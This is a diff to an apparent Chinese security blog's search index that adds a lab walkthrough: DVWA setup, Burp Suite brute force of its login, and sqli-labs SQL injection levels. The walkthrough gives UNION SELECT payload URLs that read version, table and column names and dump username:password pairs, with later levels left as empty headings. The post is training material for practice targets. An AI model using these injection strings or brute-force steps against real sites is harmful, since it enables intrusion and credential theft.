@@ -4,6 +4,37 @@
   
     
     <entry>
+      <title>sqli-labs实战演练</title>
+      <link href="posts/4a63.html"/>
+      <url>posts/4a63.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="一、phpstudy搭建dvwa"><a href="#一、phpstudy搭建dvwa" class="headerlink" title="一、phpstudy搭建dvwa"></a>一、phpstudy搭建dvwa</h2><h3 id="1-搭建DVWA"><a href="#1-搭建DVWA" class="headerlink" title="1. 搭建DVWA"></a>1. 搭建DVWA</h3><p><img src="/../img/1607933242151.png" alt="1607933242151"></p><p>​                                                  </p><h3 id="2-修改数据库密码"><a href="#2-修改数据库密码" class="headerlink" title="2. 修改数据库密码"></a>2. 修改数据库密码</h3><p>   <img src="/../img/1607933305036.png" alt="1607933305036"></p><h3 id="3-启动phpstudy，访问dvwa"><a href="#3-启动phpstudy，访问dvwa" class="headerlink" title="3. 启动phpstudy，访问dvwa"></a>3. 启动phpstudy，访问dvwa</h3><p>   <img src="/../img/1607933317915.png" alt="1607933317915"></p><p> <img src="/../img/1607933327010.png" alt="1607933327010"></p><h2 id="二、dvwa-brute-force模块使用burpsuite暴力破解"><a href="#二、dvwa-brute-force模块使用burpsuite暴力破解" class="headerlink" title="二、dvwa brute force模块使用burpsuite暴力破解"></a>二、dvwa brute force模块使用burpsuite暴力破解</h2><h3 id="1-开启burpsuit-代理"><a href="#1-开启burpsuit-代理" class="headerlink" title="1. 开启burpsuit 代理"></a>1. 开启burpsuit 代理</h3><p>   <img src="/../img/1607933347568.png" alt="1607933347568"></p><h2 id="2-抓取数据，将其发送到intruder模块"><a href="#2-抓取数据，将其发送到intruder模块" class="headerlink" title="2. 抓取数据，将其发送到intruder模块"></a>2. 抓取数据，将其发送到intruder模块</h2><p>   <img src="/../img/1607933364567.png" alt="1607933364567"></p><p>将password设置为破解的payload</p><p>   <img src="/../img/1607933375791.png" alt="1607933375791"></p><p>选择一个字典包，进行破解</p><p>   <img src="/../img/1607933413535.png" alt="1607933413535"></p><p>修改线程，提高破解速率</p><p>   <img src="/../img/1607933425110.png" alt="1607933425110"></p><h2 id="三、安全实验–sql注入–sqli-labs靶场"><a href="#三、安全实验–sql注入–sqli-labs靶场" class="headerlink" title="三、安全实验–sql注入–sqli-labs靶场"></a>三、安全实验–sql注入–sqli-labs靶场</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><h4 id="1、输入-判断闭合类型"><a href="#1、输入-判断闭合类型" class="headerlink" title="1、输入 \ 判断闭合类型"></a>1、输入 \ 判断闭合类型</h4><p><a href="http://bbe0a838.yunyansec.com/Less-1/?id=1%5C">http://bbe0a838.yunyansec.com/Less-1/?id=1\</a></p><p>   <img src="/../img/1607933465451.png" alt="1607933465451"></p><p>由此可知是 <strong>‘</strong> 闭合</p><h4 id="2、输入单引号进行闭合"><a href="#2、输入单引号进行闭合" class="headerlink" title="2、输入单引号进行闭合"></a>2、输入单引号进行闭合</h4><p><a href="http://bbe0a838.yunyansec.com/Less-1/?id=1&#39;">http://bbe0a838.yunyansec.com/Less-1/?id=1&#39;</a> –+</p><p>   <img src="/../img/1607933503149.png" alt="1607933503149"></p><h4 id="3、输入order-by-探测字段列数"><a href="#3、输入order-by-探测字段列数" class="headerlink" title="3、输入order by 探测字段列数"></a>3、输入order by 探测字段列数</h4><p><strong>Order by 5</strong></p><p>   <img src="/../img/1607933516960.png" alt="1607933516960"></p><p> <strong>Order by 3</strong></p><p>   <img src="/../img/1607933527706.png" alt="1607933527706"></p><p><strong>Order by 4</strong></p><p>   <img src="/../img/1607933555802.png" alt="1607933555802"></p><p>由此可判断有3列</p><h4 id="4、使用union-select-获取数据库信息"><a href="#4、使用union-select-获取数据库信息" class="headerlink" title="4、使用union select 获取数据库信息"></a>4、使用union select 获取数据库信息</h4><p><a href="http://bbe0a838.yunyansec.com/Less-1/?id=-1&#39;">http://bbe0a838.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,2,3 –+</p><p>   <img src="/../img/1607933584904.png" alt="1607933584904"></p><p>可在2，3处进行SQL注入</p><p> <strong>获取数据库版本信息、数据库名等</strong></p><p><a href="http://bbe0a838.yunyansec.com/Less-1/?id=-1&#39;">http://bbe0a838.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,database(),@@version –+</p><p><img src="/../img/1607933695681.png" alt="1607933695681"></p><p> <strong>获取数据库security中的表名</strong></p><pre class=" language-Sql"><code class="language-Sql">http://bbe0a838.yunyansec.com/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><img src="/../img/1607934052784.png" alt="1607934052784"></p><p> <strong>获取数据表users中的字段</strong></p><pre><code>http://bbe0a838.yunyansec.com/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; --+</code></pre><p><img src="/../img/1607934487404.png" alt="1607934487404"></p><p><strong>获取users表中的数据</strong></p><pre><code>http://bbe0a838.yunyansec.com/Less-1/?id=-1&#39; union select 1,2,group_concat(username,0x3a,password) from users --+</code></pre><p><img src="/../img/1607934800913.png" alt="1607934800913"></p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><h4 id="1、输入-判断闭合类型-1"><a href="#1、输入-判断闭合类型-1" class="headerlink" title="1、输入 \ 判断闭合类型"></a>1、输入 \ 判断闭合类型</h4><pre><code>&lt;http://bbe0a838.yunyansec.com/Less-1/?id=2\&gt;</code></pre><p><img src="/../img/1607935464289.png" alt="1607935464289"></p><p><strong>再使用and 和 or 进行判断</strong></p><pre><code>http://bbe0a838.yunyansec.com/Less-2/?id=2 and 1=1</code></pre><p><img src="/../img/1607935590647.png" alt="1607935590647"></p><pre><code>http://bbe0a838.yunyansec.com/Less-2/?id=2 and 1=2</code></pre><p><img src="/../img/1607935642040.png" alt="1607935642040"></p><p>由此可以判断是数字型注入。</p><h4 id="2、输入order-by-探测字段列数"><a href="#2、输入order-by-探测字段列数" class="headerlink" title="2、输入order by 探测字段列数"></a>2、输入order by 探测字段列数</h4><p><img src="/../img/1607935784544.png" alt="1607935784544"></p><h4 id="4、使用union-select-获取数据库信息-1"><a href="#4、使用union-select-获取数据库信息-1" class="headerlink" title="4、使用union select 获取数据库信息"></a>4、使用union select 获取数据库信息</h4><p><img src="/../img/1607935932826.png" alt="1607935932826"></p><p> <strong>获取数据库版本信息、数据库名等</strong></p><p><a href="http://b35c43da.yunyansec.com/Less-2/?id=-2">http://b35c43da.yunyansec.com/Less-2/?id=-2</a> union select 1,database(),user()</p><p><img src="/../img/1607936034164.png" alt="1607936034164"></p><p><strong>获取数据库security中的表名</strong></p><p><img src="/../img/1607936829373.png" alt="1607936829373"></p><p><strong>获取数据表users中的字段</strong></p><p><img src="/../img/1607936802973.png" alt="1607936802973"></p><p><strong>获取users表中的数据</strong></p><p><img src="/../img/1607936736661.png" alt="1607936736661"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><h4 id="1、输入-判断闭合类型-2"><a href="#1、输入-判断闭合类型-2" class="headerlink" title="1、输入 \ 判断闭合类型"></a>1、输入 \ 判断闭合类型</h4><p><img src="/../img/1607936970730.png" alt="1607936970730"></p><p>由此可以判断是 ‘) 进行闭合的。</p><h4 id="2、输入order-by-探测字段列数-1"><a href="#2、输入order-by-探测字段列数-1" class="headerlink" title="2、输入order by 探测字段列数"></a>2、输入order by 探测字段列数</h4><p><img src="/../img/1607937101512.png" alt="1607937101512"></p><h4 id="3、获取数据库信息"><a href="#3、获取数据库信息" class="headerlink" title="3、获取数据库信息"></a>3、获取数据库信息</h4><p><img src="/../img/1607937184044.png" alt="1607937184044"></p><p><strong>获取数据库security中的表名</strong></p><p><img src="/../img/1607937324823.png" alt="1607937324823"></p><p><strong>获取数据表users中的字段</strong></p><p><img src="/../img/1607937356391.png" alt="1607937356391"></p><p><strong>获取users表中的数据</strong></p><p><img src="/../img/1607937406513.png" alt="1607937406513"></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>1、输入id值观察</p><p><img src="/../img/1607937641214.png" alt="1607937641214"></p><h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><h4 id="1、输入-判断闭合类型-3"><a href="#1、输入-判断闭合类型-3" class="headerlink" title="1、输入 \ 判断闭合类型"></a>1、输入 \ 判断闭合类型</h4><p><strong>再使用and 和 or 进行判断</strong></p><p>由此可以判断是数字型注入。</p><h4 id="2、输入order-by-探测字段列数-2"><a href="#2、输入order-by-探测字段列数-2" class="headerlink" title="2、输入order by 探测字段列数"></a>2、输入order by 探测字段列数</h4><p><strong>获取数据库security中的表名</strong></p><p><strong>获取数据表users中的字段</strong></p><p><strong>获取users表中的数据</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+            <tag> sqli-labs </tag>
+            
+            <tag> 安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>渗透测试之常见的shell反弹</title>
       <link href="posts/b956.html"/>
       <url>posts/b956.html</url>
@@ -22,11 +53,11 @@
             
             <tag> 渗透测试 </tag>
             
+            <tag> 安全 </tag>
+            
             <tag> shell反弹 </tag>
             
             <tag> web </tag>
-            
-            <tag> 安全 </tag>
             
         </tags>
       
